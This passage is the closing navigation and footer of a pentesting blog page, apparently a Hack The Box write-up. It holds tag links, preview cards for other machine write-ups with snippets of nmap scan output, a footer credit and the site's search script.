href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/hard/">hard</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/pentesting/htb/machines/traverxec"><div class="card-body"> <em class="small" data-ts="1672527600" data-df="ll" > Jan 1, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB | Traverxec</h3><div class="text-muted small"><p> Fingerprint Scan The scan show: 1 2 3 4 5 6 7 8 9 10 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa99a81668cd41ccf96...</p></div></div></a></div><div class="card"> <a href="/pentesting/htb/machines/paper"><div class="card-body"> <em class="small" data-ts="1653084000" data-df="ll" > May 21, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB | Paper</h3><div class="text-muted small"><p> Enumeration nmap ❯ nmap -sVC 10.10.11.143 -oN nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 18:04 CEST Nmap scan report for 10.10.11.143 Host is up (0.28s latency). Not shown: 997 ...</p></div></div></a></div><div class="card"> <a href="/pentesting/htb/machines/late"><div class="card-body"> <em class="small" data-ts="1653861600" data-df="ll" > May 30, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB | Late</h3><div class="text-muted small"><p> Enumeration After the ping we can guess that is a Linux. The ports scan give us: # Nmap 7.92 scan initiated Sat May 28 20:31:36 2022 as: nmap -p- -sS --min-rate 5000 -oG ports 10.10.11.156 Host: 10...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/pentesting/htb/machines/shared" class="btn btn-outline-primary" prompt="Older"><p>HTB | Shared</p></a> <a href="/pentesting/htb/machines/moderators" class="btn btn-outline-primary" prompt="Newer"><p>HTB | Moderators</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/giangkhail12999">Cong Khai NGUYEN</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" rel="noopener">Jekyll</a> with <a href="#" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/hard/">hard</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script>
